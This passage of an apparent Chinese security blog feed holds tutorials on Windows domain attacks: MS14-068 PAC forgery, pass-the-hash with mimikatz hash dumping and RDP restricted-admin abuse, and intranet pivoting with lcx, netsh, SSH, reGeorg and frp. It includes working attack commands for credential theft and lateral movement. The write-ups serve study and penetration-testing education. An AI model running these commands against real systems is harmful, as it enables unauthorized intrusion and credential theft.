&lt;p&gt;Client 向 KDC 的 AS 模块发起认证请求，AS 返回 TGT 时，会根据 Client 所在的组，生成 PAC，包含 Client 的 User SID、Group SID，以及用于确保 PAC 不被篡改的 2 个签名。将 PAC 作为 TGT 的一部分，发送给 Client。&lt;/p&gt;
&lt;p&gt;Client 使用 TGT 向 KDC 的 TGS 模块发起访问 Server 服务时，KDC 的 TGS 模块首先解密TGT，并通过校验 2 个签名，以验证 PAC 的合法性。如果通过验证，KDC 的 TGS 模块用 2 个新的签名替代老的签名来保证 PAC 不被篡改。第一个签名的密钥为 &lt;strong&gt;Server 的 NTLM&lt;/strong&gt;，第二个密钥为 &lt;strong&gt;Server 与 Client 的临时会话密钥（Server Session Key）&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;重新签名后的 PAC 被放置在签发的访问票据 TGS 中，并使用 Server 的 NTLM 作为密钥加密TGS。Server 收到来自 Client 的 TGS 后，解密 TGS 验证合法性，校验 PAC 中的 2 个签名，确认 PAC 的合法性，然后确认 Client 的访问权限。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因&#34;&gt;漏洞成因&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Client 在发起认证请求时，通过设置 &lt;code&gt;include-PAC&lt;/code&gt; 为 &lt;code&gt;False&lt;/code&gt;，则返回的 &lt;code&gt;TGT&lt;/code&gt; 中不会包含 &lt;code&gt;PAC&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 243; 
			flex-basis: 585px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301204714998.png&#34; data-size=&#34;1100x451&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301204714998.png&#34;
			width=&#34;1100&#34;
			height=&#34;451&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301204714998_hu1bf18fa760aca5f12851a15be238b0cb_303008_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-9/image-20220301204714998_hu1bf18fa760aca5f12851a15be238b0cb_303008_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 176; 
			flex-basis: 422px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301204800061.png&#34; data-size=&#34;1614x916&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301204800061.png&#34;
			width=&#34;1614&#34;
			height=&#34;916&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301204800061_hu8468567b593c518a833972a995e87e3c_989926_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-9/image-20220301204800061_hu8468567b593c518a833972a995e87e3c_989926_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一个原因&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;KDC 对 PAC 进行验证时，对于 PAC 尾部的签名算法，虽然RFC上规定必须是带有 Key 的签名算法才可以，但微软在实现上，允许任意签名算法，只要客户端指定任意签名算法，KDC 服务器就会使用指定的算法进行签名验证。因此，伪造的任意内容都可以是合法的，直接加上内容的值作为签名即可。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第二个原因&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当设置了 include-PAC 为false，返回的TGT没有 PAC，随后构造一个假的PAC和TGT一并发送给 KDC， KDC 在收到TGT 和 PAC 后，仍然能够正确解析出没有放在 TGT 中的 PAC 信息。&lt;/p&gt;
&lt;p&gt;PAC 必须是密文，经过 Key 加密的，所以 KDC 会从 收到的TGT 中取出 Session Key，把 PAC 信息解密并利用客户端设定的签名算法验证签名。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第三个原因&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;KDC 先验证缺少 PAC 的 TGT， 成功后，再去验证不在 TGT 中的 PAC 的合法性。如果 2 个均验证成功，&lt;strong&gt;KDC 把 PAC 中的 &lt;code&gt;User SID、Group SID&lt;/code&gt; 取出来，重新使用进行签名，签名算法和密钥与设置 &lt;code&gt;inclue-pac&lt;/code&gt; 标志位为 &lt;code&gt;TRUE&lt;/code&gt; 时一模一样&lt;/strong&gt;。将新产生的 PAC 加入到解密后的 TGT 中，再重新加密制作全新的 TGT 发送给 Client，注意不是 TGS。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用流程：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发送 as-req，并且 &lt;strong&gt;include-PAC 为false&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;客户端收到 TGT(不带 PAC)，&lt;strong&gt;利用 Session Key 构造一个假的 PAC(声明自己为域管)，并指明签名算法&lt;/strong&gt;，最后和 TGT 一起发送给KDC(TGS-req)&lt;/li&gt;
&lt;li&gt;KDC 会先验证 TGT ，再验证我们伪造的 PAC，均验证成功后，就会按照i nclue-pac = True 时的情况正常进行 kerberos 流程&lt;/li&gt;
&lt;li&gt;最后返回给我们一个正常的声明为域管的合法 TGT&lt;/li&gt;
&lt;li&gt;注入票据即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基于 MS14-068 制作TGT票据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 210; 
			flex-basis: 504px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301212054817.png&#34; data-size=&#34;1089x518&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301212054817.png&#34;
			width=&#34;1089&#34;
			height=&#34;518&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301212054817_hub036e7033719af24c09e555007b28d7a_274382_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-9/image-20220301212054817_hub036e7033719af24c09e555007b28d7a_274382_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 mimikatz 导入票据&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz.exe &amp;quot;kerberos::ptc TGT_eviluser@testlab.com.ccache” exit 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 260; 
			flex-basis: 624px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301212436065.png&#34; data-size=&#34;1057x406&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301212436065.png&#34;
			width=&#34;1057&#34;
			height=&#34;406&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301212436065_hu5bb9449dbcfdb385129f3b4f9df78066_176277_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-9/image-20220301212436065_hu5bb9449dbcfdb385129f3b4f9df78066_176277_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问目标 c 盘目录&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 149; 
			flex-basis: 358px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301214857818.png&#34; data-size=&#34;560x375&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301214857818.png&#34;
			width=&#34;560&#34;
			height=&#34;375&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301214857818_hu6b3d1657566dab04532c0c9a107a78e8_228924_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-9/image-20220301214857818_hu6b3d1657566dab04532c0c9a107a78e8_228924_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PTH 攻击</title>
        <link>https://coollllllll.github.io/p/intranet-4/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-4/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post PTH 攻击" /&gt;&lt;h1 id=&#34;pth-攻击&#34;&gt;PTH 攻击&lt;/h1&gt;
&lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
&lt;p&gt;PTH(Pass The Hash)&lt;/p&gt;
&lt;p&gt;当获取到某主机本地管理员组成员账号的口令NTLM后，不需要破解获取口令明文，使用PTH方式将管理员账号及NTLM注入当前到当前会话并作为凭据，利用该凭据可渗透获取周围主机管理权限。适用于工作组环境和域环境。&lt;/p&gt;
&lt;h2 id=&#34;条件&#34;&gt;条件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对方主机需存在相同的账号，且是管理员组成员&lt;/li&gt;
&lt;li&gt;初始机子上需要获取系统权限，才能进行会话注入&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;uac&#34;&gt;UAC&lt;/h2&gt;
&lt;p&gt;用户帐户控制 (User Account Control) 是 &lt;code&gt;Windows Vista&lt;/code&gt;（及更高版本操作系统）中一组新的基础结构技术，可以帮助阻止恶意程序损坏系统，同时也可以帮助组织部署更易于管理的平台。 使用 &lt;code&gt;UAC&lt;/code&gt;，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。&lt;code&gt;UAC&lt;/code&gt; 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。&lt;/p&gt;
&lt;p&gt;用户帐户控制(&lt;code&gt;UAC&lt;/code&gt;)是新版 &lt;code&gt;Windows&lt;/code&gt; 的核心安全功能，也是其最常被人误解的众多安全功能当中的一种。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在UAC下，一个用户是目标机器上的本地管理员组的成员，当他建立远程管理连接时，他无法获取完全管理员权限，也无法权限提升和执行管理员任务等。要想获取完全管理员权限，只能通过远程助手或远程桌面连入目标机器。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在&lt;code&gt;Admin Approval Mode&lt;/code&gt;模式下用户打开cmd会话，会判断权限，如果要打开完全管理员cmd，就要求进行认证和确认。&lt;/p&gt;
&lt;p&gt;UAC就是通过上面的注册表键值来判断所获取会话的初始权限，默认设置为 0。&lt;strong&gt;如果设置为 1，则即使 SID 为 500 的管理员也不能通过网络登录的方式获取高权限。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果在注册表中有这个键值，并且设置为 1，则所有的管理组成员都可以通过网络登录获取高权限。&lt;strong&gt;而且会忽视上面的一个表项 FilterAdministratorToken 的值。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;p&gt;在Windows NT 5.x(2003、2005)系统中，管理员组账号的网络登录(例如IPC方式)都获取系统管理权限。&lt;/p&gt;
&lt;p&gt;而在Windows NT 6.x系统及更高版本中，管理员组(SID非500)账号网络登录后不能获取系统管理权限，除非是administrator(SID=500)。&lt;/p&gt;
&lt;h3 id=&#34;工作组环境&#34;&gt;工作组环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;先用mimikatz获取本地管理员组成员的NTLM，并记录&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
lsadump::lsa /patch 
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;PTH攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sekurlsa::pth /user:administrator /domain:workgroup /ntlm:xxx
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;微软已经针对PTH进行修复过，实际测试中发现，管理员组(SID非500)账号网络登录PTH已经无法成功，而 &lt;code&gt;Administrator&lt;/code&gt; (SID 500) 账号仍然可行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;攻击成功后会回弹一个会话，即cmd&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;域环境&#34;&gt;域环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;获取当前域内用户的NTLM&lt;/li&gt;
&lt;li&gt;PTH攻击：&lt;strong&gt;对另外一个域的目标计算机(他所在域用户是他本地管理员组成员，且账号密码相同)执行PTH&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sekurlsa::pth /user:eviluser /domain:adsec.com /ntlm:xxx
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;获取完全管理员会话&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;工作组环境下，会受上述注册表两值的影响；&lt;/p&gt;
&lt;p&gt;而在域环境下不受影响。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;msf-中的-pth&#34;&gt;MSF 中的 PTH&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exploit/windows/smb/psexec
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;补丁-kb2871997&#34;&gt;补丁-KB2871997&lt;/h2&gt;
&lt;h3 id=&#34;目的&#34;&gt;目的&lt;/h3&gt;
&lt;p&gt;阻止使用本地账户网络登录和远程交互式登录到一台加入到域内服务器的机器上。&lt;/p&gt;
&lt;h3 id=&#34;修复结果&#34;&gt;修复结果&lt;/h3&gt;
&lt;p&gt;安装 &lt;code&gt;KB2871997&lt;/code&gt; 补丁后，其他方面并没有太多的变化 。&lt;/p&gt;
&lt;p&gt;补丁会给本地账号添加一个 &lt;code&gt;S-1-5-113&lt;/code&gt; 的 &lt;code&gt;SID&lt;/code&gt;，为管理员组中的本地账号添加一个 &lt;code&gt;S-1-5-114&lt;/code&gt; 的 &lt;code&gt;SID&lt;/code&gt;，这样方便通过域策略进行管理，例如&lt;strong&gt;从域策略中全面禁止这类账号的网络登录。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;针对rdp的hash传递攻击&#34;&gt;针对RDP的Hash传递攻击&lt;/h2&gt;
&lt;p&gt;说起 hash 传递攻击（pth），想到一般的都是 &lt;code&gt;psexec wce mimikatz&lt;/code&gt; 等直接执行命令。&lt;/p&gt;
&lt;p&gt;本节绍了一种利用 &lt;code&gt;mimikatz + NThash &lt;/code&gt;来启动 &lt;code&gt;mstsc.exe&lt;/code&gt; 实现远程登陆 Windows 桌面的方法，对不能执行命令又破解不出密码的环境有很大的帮助。&lt;/p&gt;
&lt;p&gt;其原理（条件）是远程目标需要使用受限管理模式（Restricted Admin Mode），因为此模式下支持 kerberos 认证，所以能使用 hash 来登陆。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;受限模式被禁用情况下，使用如下命令开启&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 启动powershell
mimikatz.exe &amp;quot;sekurlsa::pth /user:&amp;lt;user name&amp;gt; /domain:&amp;lt;domain name&amp;gt; /ntlm:&amp;lt;the user&#39;s ntlm hash&amp;gt; /run:powershell.exe&amp;quot;

# 在powershell中修改注册表
Enter-PSSession -Computer &amp;lt;Target&amp;gt;
New-ItemProperty -Path &amp;quot;HKLM:\System\CurrentControlSet\Control\Lsa&amp;quot; -Name &amp;quot;DisableRestrictedAdmin&amp;quot; -Value &amp;quot;0&amp;quot; -PropertyType DWORD -Force
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;PTH攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sekurlsa::pth /user:&amp;lt;user name&amp;gt; /domain:&amp;lt;domain name&amp;gt; /ntlm:&amp;lt;the user&#39;s ntlm hash&amp;gt; /run:&amp;quot;mstsc.exe /restrictedadmin&amp;quot;
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>内网代理转发</title>
        <link>https://coollllllll.github.io/p/intranet-8/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-8/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-8/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 内网代理转发" /&gt;&lt;h1 id=&#34;内网代理转发&#34;&gt;内网代理转发&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;假如有这样的环境：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;外网服务器存在双网卡，内网服务器不可访问公网但可以直接和外网服务器进行通信。基于这个场景，攻击者以外网服务器作为跳板，对内网服务器进行继续渗透。&lt;/p&gt;
&lt;h2 id=&#34;端口转发类&#34;&gt;端口转发类&lt;/h2&gt;
&lt;h3 id=&#34;lcx&#34;&gt;Lcx&lt;/h3&gt;
&lt;h4 id=&#34;本地端口转发&#34;&gt;本地端口转发&lt;/h4&gt;
&lt;p&gt;防火墙等访问控制策略：不允许公网直接访问3389端口，此时可以尝试 lcx 的本地转发功能将其转发到其他端口。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先上传 lcx.exe 至外网服务器，执行如下&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lcx.exe -tran 8888 127.0.0.1 3389

# 将本地8888端口流量转发到本地3389端口
# 攻击者直接连接外网服务器8888端口
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;正向端口转发&#34;&gt;正向端口转发&lt;/h4&gt;
&lt;p&gt;拿下外网服务器权限和内网服务器账号密码，尝试直接访问内网的3389端口。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外网服务器执行&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lcx.exe -tran 8888 192.168.77.2 3389

# 将本地8888端口流量转发到内网机器3389端口
# 攻击者直接连接外网服务器8888端口
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;反向端口转发&#34;&gt;反向端口转发&lt;/h4&gt;
&lt;p&gt;拿下外网服务器和内网服务器的权限，并知道内网服务器账号密码。攻击者想要连接内网服务器的3389服务，但是防火墙规则，不允许外网服务器直接访问它。&lt;/p&gt;
&lt;p&gt;可尝试在内网机器上将内网端口主动转发到外网服务器，随后攻击者连接外网服务器即可。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外网服务器监听在7777端口，并本地转发到8888端口&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lcx.exe -listen 7777 8888
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;内网服务器主动反向连接外网服务器7777端口，并转发本地的3389端口流量&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lcx.exe -slave 192.168.77.1 7777 127.0.0.1 3389
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;攻击者连接外网服务器8888端口即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;linux-下的lcx&#34;&gt;Linux 下的Lcx&lt;/h4&gt;
&lt;p&gt;portmap就是Linux下的lcx，需要手动上传 c 文件，并进行编译使用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将流量正向转发到外网服务器的3389端口&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./portmap -m l -p1 8888 -h2 192.168.77.2 -p2 3389
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;netsh&#34;&gt;Netsh&lt;/h3&gt;
&lt;p&gt;Netsh 是 Windows 自带的命令行脚本工具，它可以建立端口映射。与 Lcx 不同，netsh 不支持反向的端口转发。&lt;/p&gt;
&lt;h4 id=&#34;本地端口转发-1&#34;&gt;本地端口转发&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;netsh interface portproxy add v4tov4 listenport=8888 connectaddress=192.168.77.1 connectport=3389 
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 删除策略
netsh interface portproxy delete v4tov4 listenport=8888
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;正向端口转发-1&#34;&gt;正向端口转发&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Netshinterface portproxy add v4tov4 listenaddress=192.168.77.1 8888 connectaddress=192.168.77.2 connectport=3389
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 删除策略
Netsh interface portproxy delete v4tov4 listenport=8888 listenaddress=192.168.77.1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ssh&#34;&gt;SSH&lt;/h3&gt;
&lt;h4 id=&#34;本地端口转发-2&#34;&gt;本地端口转发&lt;/h4&gt;
&lt;p&gt;在本地主机 Host A 上开启端口流量转发&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 本地执行
ssh -L 8866:192.168.10.3:23 -fN username@192.168.10.2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 182; 
			flex-basis: 437px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-8/image-20220306145433046.png&#34; data-size=&#34;854x468&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-8/image-20220306145433046.png&#34;
			width=&#34;854&#34;
			height=&#34;468&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-8/image-20220306145433046_hufe88f06f287b10d00f796ed16925f317_227360_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-8/image-20220306145433046_hufe88f06f287b10d00f796ed16925f317_227360_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;远程端口转发&#34;&gt;远程端口转发&lt;/h4&gt;
&lt;p&gt;在远程主机 Host B 上开启端口流量转发&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 在HostB上执行
ssh -R 8866:192.168.10.3:23 -fN username@192.168.10.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 178; 
			flex-basis: 427px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-8/image-20220306145547993.png&#34; data-size=&#34;838x470&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-8/image-20220306145547993.png&#34;
			width=&#34;838&#34;
			height=&#34;470&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-8/image-20220306145547993_hudb1054e17c2931a87d88b5aab3fcd73d_207022_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-8/image-20220306145547993_hudb1054e17c2931a87d88b5aab3fcd73d_207022_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;socks-代理类&#34;&gt;SOCKS 代理类&lt;/h2&gt;
&lt;h3 id=&#34;regeorg&#34;&gt;reGeorg&lt;/h3&gt;
&lt;p&gt;reGeorg是一款把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP通信的工具。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上传 tunnerl 文件&lt;/li&gt;
&lt;li&gt;攻击机运行：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python reGeorgSocksProxy.py -p 8080 -u http://ip:port/tunnel/tunnel.jsp
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;使用其他渗透工具时配置 socks 代理为本地8080端口即可 或者 使用Proxifier配置全局代理(Windows)、proxychains(Linux)&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：Socks协议通过TCP协议进行数据传输，因而不提供如传递 ICMP 信息之类的网络层相关服务，ping测试会发现不通。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;neo-regeorg&#34;&gt;Neo-reGeorg&lt;/h3&gt;
&lt;p&gt;reGeorg稳定性不太好，且容易被杀，&lt;strong&gt;Neo-reGeorg&lt;/strong&gt; 是一个旨在积极重构 &lt;a class=&#34;link&#34; href=&#34;https://github.com/sensepost/reGeorg&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;reGeorg&lt;/a&gt; 的项目。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提高 tunnel 连接安全性&lt;/li&gt;
&lt;li&gt;提高可用性，避免特征检测&lt;/li&gt;
&lt;li&gt;提高传输内容保密性&lt;/li&gt;
&lt;li&gt;应对更多的网络环境场景&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;基本使用：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置密码生成 tunnel并上传到WEB服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python neoreg.py generate -k password
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python neoreg.py -k password -u http://xx/tunnel.php
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;frp&#34;&gt;frp&lt;/h3&gt;
&lt;p&gt;frp 采用 Golang 编写，支持跨平台，仅需下载对应平台的二进制文件即可执行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端启动(在自己 VPS上 )&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./frps -c ./frps.ini
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[common]
bind_port = 7000
Bind_addr = 0.0.0.0
dashboard_port = 7500 # 仪表盘端口
dashboard_user = admin # 仪表盘账号与密码
dashboard_pwd = passadmin
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;客户端启动(在获取到权限的跳板服务器上)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./frpc -c ./frpc.ini
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[common]
server_addr = # VPS 地址
server_port = 7000

[plugin_socks]
type = tcp
remote_port = 46075
plugin = socks5
plugin_user = admin
plugin_passwd = admin123
use_encryption = true
use_compression = true
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>组策略相关</title>
        <link>https://coollllllll.github.io/p/intranet-3/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-3/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-3/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 组策略相关" /&gt;&lt;h1 id=&#34;组策略相关&#34;&gt;组策略相关&lt;/h1&gt;
&lt;h2 id=&#34;本地组策略和域内组策略&#34;&gt;本地组策略和域内组策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Server Manager 的组策略管理工具：主要用来管理本地内的组策略&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;更专业的组策略管理工具GPMC：可以管理多个域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
